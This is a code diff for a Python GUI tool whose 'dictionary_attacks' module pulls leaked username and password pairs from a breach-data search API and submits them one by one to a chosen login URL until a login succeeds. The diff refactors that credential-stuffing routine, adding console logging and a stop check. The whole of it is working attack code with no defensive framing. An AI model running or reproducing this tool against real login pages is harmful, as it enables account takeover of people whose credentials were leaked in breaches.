@@ -1,7 +1,7 @@
 import requests
-from kivy.clock import Clock
 
 from gui.dictionary_attacks.console_view import ConsoleView
+from gui.dictionary_attacks.stopped_manager import is_stopped
 
 
 class Credentials:
@@ -30,8 +30,13 @@ keywords = [
 ]
 
 
-def set_credentials(query, limit=10):
-    print(f"Fetching credentials for query '{query}'")
+def set_credentials(query, console_view: ConsoleView, limit=10):
+    credentials_list = []
+
+    fetch_msg = f"[INFO] Fetching credentials for query '{query}'"
+    console_view.add_text_schedule(fetch_msg)
+    print(fetch_msg)
+
     url = f"https://api.proxynova.com/comb?query={query}&limit={limit}"
 
     response = requests.get(url)
@@ -39,46 +44,45 @@ def set_credentials(query, limit=10):
     if response.status_code == 200:
         data = response.json()
         count = str(len(data["lines"]))
-        print(f"Found {count} entries for query {query}")
+        found_msg = f"[INFO] Found {count} entries for query {query}"
+        console_view.add_text_schedule(found_msg)
+        print(found_msg)
 
         if len(data["lines"]) > 0:
             for line in data["lines"]:
                 try:
                     parts = line.split(":")
-                    global_credentials_list.append(Credentials(parts[0], parts[1]))
+                    credentials_list.append(Credentials(parts[0], parts[1]))
                 except IndexError as e:
                     try:
                         parts = line.split(";")
-                        global_credentials_list.append(Credentials(parts[0], parts[1]))
+                        credentials_list.append(Credentials(parts[0], parts[1]))
                     except IndexError as e:
                         pass
 
         else:
-            print(f"Could not find any credentials for query {query}")
+            not_found_msg = f"[ERROR] Could not find any credentials for query {query}"
+            console_view.add_text_schedule(not_found_msg)
+            print(not_found_msg)
     else:
-        print(f"Error: {response.status_code}")
+        error_msg = f"[ERROR] Error: {response.status_code}"
+        console_view.add_text_schedule(error_msg)
+
+    return credentials_list
 
 
-class Output:
-    def __init__(self, success, message):
-        self.success = success
-        self.message = message
-
-    def __str__(self):
-        return f"Success: {self.success}, Message: {self.message}"
-
-
-def dictionary_attack(username_var, password_var, login_success_var, url, headers, console_view: ConsoleView):
-    output = Output(False, "")
-
-    if len(global_credentials_list) > 0:
-        for i in range(len(global_credentials_list) - 1, -1, -1):
-            output = Output(False, "")
+def dictionary_attack(username_var, password_var, login_success_var, url, headers,
+                      credentials_list, console_view: ConsoleView):
+    if len(credentials_list) > 0:
+        for credentials in credentials_list:
+            if is_stopped():
+                break
 
             try:
-                credentials = global_credentials_list[i]
-                trying = f"Trying password: {credentials.password} and {username_var}: {credentials.username}"
-                output.message = output.message + trying
+                trying = "[INFO] Trying password: {} and {}: {}".format(credentials.password, username_var,
+                                                                        credentials.username)
+                console_view.add_text_schedule(trying)
+                print(trying)
 
                 payload = {
                     username_var: credentials.username,
@@ -88,24 +92,22 @@ def dictionary_attack(username_var, password_var, login_success_var, url, header
                 response = requests.post(url, json=payload, headers=headers)
 
                 if login_success_var in response.text or response.status_code == 200:
-                    success_msg = f"\n[SUCCESS] Password found: {credentials.password}"
-                    output.message = output.message + success_msg
-                    output.success = True
+                    success_msg = f"[SUCCESS] Password found: {credentials.password}"
+                    console_view.add_text_schedule(success_msg)
+                    print(success_msg)
+                    return True
 
                 else:
-                    failed_msg = f"\n[FAILED] Password incorrect"
-                    output.message = output.message + failed_msg
-                    global_credentials_list.remove(credentials)
-                    print(output.message)
+                    failed_msg = f"[FAILED] Password incorrect"
+                    console_view.add_text_schedule(failed_msg)
+                    print(failed_msg)
 
             except Exception as e:
-                error_msg = f"\nError: {e}"
-                output.message = output.message + error_msg
+                error_msg = f"[ERROR] Error: {e}"
+                console_view.add_text_schedule(error_msg)
+                print(error_msg)
 
-            print(output.message)
-            Clock.schedule_once(lambda dt: console_view.add_text(output.message))
-
-    return output
+    return False
 
 # if __name__ == "__main__":
 # success = False
